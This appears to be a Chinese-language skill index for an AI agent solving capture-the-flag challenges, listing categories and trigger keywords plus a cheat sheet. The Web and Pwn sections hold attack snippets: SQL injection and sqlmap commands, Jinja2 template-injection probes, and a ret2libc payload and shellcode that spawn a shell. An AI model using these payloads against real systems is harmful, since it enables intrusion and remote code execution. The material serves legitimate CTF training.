# CTF 技能库 (CTF Skills)

> 路径: `skills 目录/ctf-*/SKILL.md`

---

## 技能总览

| 方向 | 技能 | 触发关键词 |
|------|------|-----------|
| Web | `ctf-web` | SQL注入、反序列化、XSS、SSRF、文件上传、SSTI、XXE |
| Crypto | `ctf-crypto` | RSA、AES、XOR、哈希、MD5碰撞、长度扩展 |
| Misc | `ctf-misc` | 隐写、LSB、流量分析、内存取证、压缩包、日志 |
| Reverse | `ctf-reverse` | IDA、Ghidra、反编译、算法逆向、调试、脱壳 |
| Pwn | `ctf-pwn` | 栈溢出、ROP、格式化字符串、堆漏洞、Shellcode |
| Writeup | `ctf-writeup` | Writeup、WP、解题报告 |
| Forensics | `ctf-forensics` | 取证、内存、磁盘、固件 |
| Malware | `ctf-malware` | 恶意软件、病毒分析、脱壳 |
| OSINT | `ctf-osint` | OSINT、社工库、情报收集 |
| AI/ML | `ctf-ai-ml` | AI安全、模型攻击、对抗样本 |

---

## 快速参考

### Web（ctf-web）

```sql
-- SQL 盲注
' OR IF(1=1,SLEEP(3),0)#
sqlmap -u "http://target/?id=1" --batch --technique=B

-- PHP 反序列化绕过 __wakeup
O:4:"name":2:{...} → O:4:"name":1:{...}

-- SSTI Jinja2
{{7*7}} → {{config}}
{{lipsum.__globals__.__builtins__}}
```

### Crypto（ctf-crypto）

```python
# RSA 共模攻击
from sympy import crt
m = crt([n1,n2,n3],[c1,c2,c3])[0]

# XOR 暴力破解
for k in range(256):
    d = bytes([b^k for b in cipher])
    if b"flag" in d: print(d)

# Hash Length Extension
import hashpump
```

### Misc（ctf-misc）

```bash
# LSB 隐写
zsteg image.png --all

# Steghide
steghide extract -sf image.jpg -p ""

# PCAP 流量
tshark -r capture.pcap -Y "http" -T fields -e http.file_data

# 内存取证
volatility -f memory.dmp --profile=Win7SP1x64 pslist
```

### Reverse（ctf-reverse）

```python
# 常见逆向解密模板
data = [0x66, 0x6B, ...]  # 从 IDA 提取
key = [1, 2, 3]
result = [(data[i] ^ key[i % len(key)]) - 0x10 for i in range(len(data))]
print(''.join(chr(c) for c in result))
```

### Pwn（ctf-pwn）

```python
from pwn import *
context.arch = 'amd64'

# 找偏移
offset = cyclic_find(0x6161616c)

# ret2libc
payload = flat([
    b'A' * offset,
    p64(libc.sym['system']),
    p64(0),
    p64(next(libc.search(b'/bin/sh')))
])

# Shellcode
shellcode = asm(shellcraft.amd64.linux.sh())
```

---

## 其他Agent调用方式

Agent 间调用时，建议传递：
- 题目类型（web/crypto/misc/reverse/pwn）
- 附件路径或 URL
- 已知提示（若有）

示例 prompt：
```
你是CTF Web方向专家。请分析 /path/to/challenge。
类型：SQL注入/反序列化/SSTI（选填）
已知提示：（如有）
请输出：解题思路 + 关键Payload + 最终flag
```
